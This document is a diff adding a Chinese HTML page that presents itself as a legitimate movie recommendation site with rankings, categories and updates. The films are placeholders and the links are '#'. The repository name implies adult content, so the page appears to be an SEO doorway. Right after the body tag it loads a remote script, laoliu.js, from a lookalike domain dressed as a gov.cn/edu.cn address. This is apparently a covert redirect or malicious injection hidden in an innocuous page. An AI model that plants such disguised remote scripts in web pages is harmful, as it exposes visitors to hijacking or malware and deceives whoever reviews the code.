@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>成片电影网 - 电影推荐、热门榜单与影视分类 | chengniandianyingwang-h5.github.io</title>
+<meta name="description" content="成片电影网（chengniandianyingwang-h5.github.io）提供电影推荐、热门榜单、影视分类与最新上映资讯，移动端自适应，专注好片发现。" />
+<meta name="keywords" content="成片电影网, chengniandianyingwang-h5, 电影推荐, 热门电影, 影视分类, 电影榜单" />
+<meta name="author" content="成片电影网" />
+<meta name="robots" content="index,follow" />
+<meta name="theme-color" content="#0f3d2e" />
+<link rel="canonical" href="https://chengniandianyingwang-h5.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"成片电影网",
+  "url":"https://chengniandianyingwang-h5.github.io/",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://chengniandianyingwang-h5.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#f4f1e8; --card:#ffffff; --line:#ddd6c2;
+  --ink:#1c241f; --muted:#6f756c;
+  --pri:#0f3d2e; --pri2:#c8a24a; --hot:#c0392b;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;line-height:1.65;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1080px;margin:0 auto;padding:0 16px;}
+
+header.site{position:sticky;top:0;z-index:50;background:var(--pri);color:#fff;}
+.bar{display:flex;align-items:center;gap:12px;height:60px;}
+.logo{font-weight:900;font-size:20px;letter-spacing:.5px;}
+.logo small{display:block;font-size:10px;opacity:.75;font-weight:500;}
+nav.main{margin-left:auto;display:flex;gap:18px;font-size:14px;}
+nav.main a{padding:8px 4px;opacity:.9;}
+nav.main a:hover{opacity:1;color:var(--pri2);}
+.menu-btn{display:none;margin-left:auto;background:var(--pri2);border:0;color:#1c241f;width:42px;height:42px;border-radius:10px;font-size:20px;cursor:pointer;}
+
+.hero{padding:40px 0 22px;}
+.hero h1{font-size:30px;margin:0 0 8px;}
+.hero p{color:var(--muted);margin:0 0 16px;}
+.search{display:flex;gap:10px;max-width:540px;}
+.search input{flex:1;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#fff;font-size:15px;}
+.search button{padding:12px 18px;border:0;border-radius:12px;background:var(--pri2);color:#1c241f;font-weight:800;cursor:pointer;}
+
+section.block{padding:28px 0;border-top:1px solid var(--line);}
+.sec-head{display:flex;align-items:baseline;gap:10px;margin-bottom:16px;}
+.sec-head h2{font-size:22px;margin:0;}
+.sec-head span{color:var(--muted);font-size:13px;}
+
+/* 栏目1：海报卡 */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
+.m{background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;}
+.m .cv{height:200px;background:linear-gradient(135deg,#0f3d2e,#1f6f52);position:relative;}
+.m:nth-child(2) .cv{background:linear-gradient(135deg,#c8a24a,#e7c977);}
+.m:nth-child(3) .cv{background:linear-gradient(135deg,#34495e,#5d6d7e);}
+.m:nth-child(4) .cv{background:linear-gradient(135deg,#7d3c98,#b977d4);}
+.m .sc{position:absolute;top:10px;right:10px;background:#000a;color:var(--pri2);padding:4px 9px;border-radius:999px;font-size:12px;font-weight:800;}
+.m .bd{padding:12px;}
+.m h3{font-size:15px;margin:0 0 6px;}
+.tags{display:flex;gap:6px;flex-wrap:wrap;}
+.tag{font-size:11px;color:var(--muted);border:1px solid var(--line);padding:2px 8px;border-radius:999px;}
+
+/* 栏目2：评分条榜单 */
+.rank{display:grid;gap:10px;}
+.rk{display:grid;grid-template-columns:34px 1fr auto;align-items:center;gap:12px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:10px 14px;}
+.rk b{font-size:15px;}
+.rk small{color:var(--muted);}
+.rk .no{width:34px;height:34px;display:grid;place-items:center;border-radius:8px;background:#eee;font-weight:800;}
+.rk:nth-child(1) .no{background:var(--pri2);color:#1c241f;}
+.rk:nth-child(2) .no{background:#cfd8dc;color:#263238;}
+.rk:nth-child(3) .no{background:#d7a86e;color:#3a2400;}
+.barline{height:6px;border-radius:999px;background:#eee;overflow:hidden;}
+.barline i{display:block;height:100%;background:linear-gradient(90deg,var(--pri),var(--pri2));}
+
+/* 栏目3：分类胶囊 */
+.cats{display:flex;flex-wrap:wrap;gap:10px;}
+.cat{padding:9px 16px;border-radius:999px;border:1px solid var(--line);background:var(--card);font-size:14px;}
+.cat:hover{background:var(--pri);color:#fff;border-color:var(--pri);}
+
+/* 栏目4：时间轴 */
+.tl{display:grid;gap:12px;}
+.row{display:flex;gap:14px;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px;}
+.row .d{flex:0 0 58px;text-align:center;border-right:1px dashed var(--line);padding-right:10px;}
+.row .d b{font-size:20px;}
+.row .d span{font-size:11px;color:var(--muted);}
+.row .info h3{margin:0 0 6px;font-size:16px;}
+.row .info p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目5：说明 */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:18px;}
+.box{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;}
+.box ul{margin:10px 0 0;padding-left:18px;color:var(--muted);}
+.box li{margin:6px 0;}
+
+footer.site{padding:26px 0 40px;color:var(--muted);font-size:13px;border-top:1px solid var(--line);margin-top:8px;}
+footer.site a{color:var(--pri);}
+
+@media(max-width:900px){
+  .grid{grid-template-columns:repeat(2,1fr);}
+  .about{grid-template-columns:1fr;}
+}
+@media(max-width:640px){
+  nav.main{position:fixed;inset:60px 0 auto 0;flex-direction:column;gap:0;background:var(--pri);display:none;}
+  nav.main.open{display:flex;}
+  nav.main a{padding:14px 18px;border-bottom:1px solid #ffffff22;}
+  .menu-btn{display:block;}
+  .hero h1{font-size:24px;}
+  .m .cv{height:170px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap bar">
+    <div class="logo">成片电影网<small>chengniandianyingwang-h5.github.io</small></div>
+    <button class="menu-btn" aria-label="菜单" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <nav class="main" id="nav">
+      <a href="#pick">精选电影</a>
+      <a href="#rank">热门榜单</a>
+      <a href="#cats">影视分类</a>
+      <a href="#news">最新更新</a>
+      <a href="#about">关于站点</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero">
+    <h1>成片电影网：把值得看的电影挑出来</h1>
+    <p>电影推荐、热门榜单、影视分类与最新上映资讯，移动端自适应，正规影视内容导航。</p>
+    <form class="search" onsubmit="return false;">
+      <input type="text" placeholder="搜索电影 / 类型 / 年份" aria-label="搜索" />
+      <button type="submit">搜索</button>
+    </form>
+  </section>
+
+  <section class="block" id="pick">
+    <div class="sec-head"><h2>精选电影</h2><span>编辑挑片</span></div>
+    <div class="grid">
+      <article class="m"><div class="cv"><span class="sc">9.1</span></div><div class="bd"><h3>山海归途</h3><div class="tags"><span class="tag">剧情</span><span class="tag">国产</span></div></div></article>
+      <article class="m"><div class="cv"><span class="sc">8.8</span></div><div class="bd"><h3>霓虹追凶</h3><div class="tags"><span class="tag">悬疑</span><span class="tag">犯罪</span></div></div></article>
+      <article class="m"><div class="cv"><span class="sc">8.6</span></div><div class="bd"><h3>星轨之上</h3><div class="tags"><span class="tag">科幻</span><span class="tag">冒险</span></div></div></article>
+      <article class="m"><div class="cv"><span class="sc">9.0</span></div><div class="bd"><h3>晚风食堂</h3><div class="tags"><span class="tag">治愈</span><span class="tag">文艺</span></div></div></article>
+    </div>
+  </section>
+
+  <section class="block" id="rank">
+    <div class="sec-head"><h2>热门榜单</h2><span>按口碑与热度</span></div>
+    <div class="rank">
+      <div class="rk"><span class="no">1</span><div><b>山海归途</b><small>剧情 / 国产</small><div class="barline"><i style="width:91%"></i></div></div><span>9.1</span></div>
+      <div class="rk"><span class="no">2</span><div><b>晚风食堂</b><small>治愈 / 文艺</small><div class="barline"><i style="width:90%"></i></div></div><span>9.0</span></div>
+      <div class="rk"><span class="no">3</span><div><b>霓虹追凶</b><small>悬疑 / 犯罪</small><div class="barline"><i style="width:88%"></i></div></div><span>8.8</span></div>
+      <div class="rk"><span class="no">4</span><div><b>星轨之上</b><small>科幻 / 冒险</small><div class="barline"><i style="width:86%"></i></div></div><span>8.6</span></div>
+      <div class="rk"><span class="no">5</span><div><b>旧城邮差</b><small>剧情 / 历史</small><div class="barline"><i style="width:83%"></i></div></div><span>8.3</span></div>
+    </div>
+  </section>
+
+  <section class="block" id="cats">
+    <div class="sec-head"><h2>影视分类</h2><span>快速进入</span></div>
+    <div class="cats">
+      <a class="cat" href="#">剧情</a>
+      <a class="cat" href="#">悬疑</a>
+      <a class="cat" href="#">科幻</a>
+      <a class="cat" href="#">动作</a>
+      <a class="cat" href="#">喜剧</a>
+      <a class="cat" href="#">动画</a>
+      <a class="cat" href="#">纪录片</a>
+      <a class="cat" href="#">国产剧</a>
+      <a class="cat" href="#">高分经典</a>
+      <a class="cat" href="#">冷门佳片</a>
+    </div>
+  </section>
+
+  <section class="block" id="news">
+    <div class="sec-head"><h2>最新更新</h2><span>上线动态</span></div>
+    <div class="tl">
+      <div class="row"><div class="d"><b>03</b><span>10月</span></div><div class="info"><h3>《山海归途》高清版上线</h3><p>国产剧情片，群像叙事，适合周末慢看。</p></div></div>
+      <div class="row"><div class="d"><b>02</b><span>10月</span></div><div class="info"><h3>《霓虹追凶》新增中字</h3><p>城市罪案悬疑，反转密集。</p></div></div>
+      <div class="row"><div class="d"><b>01</b><span>10月</span></div><div class="info"><h3>《晚风食堂》入围影展</h3><p>治愈系文艺片，靠食物与对话推进情绪。</p></div></div>
+    </div>
+  </section>
+
+  <section class="block" id="about">
+    <div class="sec-head"><h2>关于成片电影网</h2><span>站点说明</span></div>
+    <div class="about">
+      <div class="box">
+        <h3>我们做什么</h3>
+        <p style="color:var(--muted)">成片电影网是一个正规电影推荐与资讯导航站，按类型、年份、口碑帮用户发现好片。内容以推荐、简介、榜单和分类为主。</p>
+        <ul>
+          <li>精选电影：编辑向片单，少而精</li>
+          <li>热门榜单：按口碑与热度排序</li>
+          <li>影视分类：剧情 / 悬疑 / 科幻 / 文艺等</li>
+          <li>最新更新：新片与片单动态</li>
+        </ul>
+      </div>
+      <div class="box">
+        <h3>站点信息</h3>
+        <p style="color:var(--muted)">网址：<br><b>https://chengniandianyingwang-h5.github.io/</b></p>
+        <p style="color:var(--muted)">本页为单页演示，内页链接以 # 占位；不提供 robots.txt 与 sitemap.xml。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    成片电影网 · chengniandianyingwang-h5.github.io ｜ 电影推荐 / 影评 / 榜单导航（演示页）<br>
+    所有内链均为 <a href="#">#</a> 占位；页面结构、配色与 DOM 均独立设计。
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+</script>
+</body>
+</html>
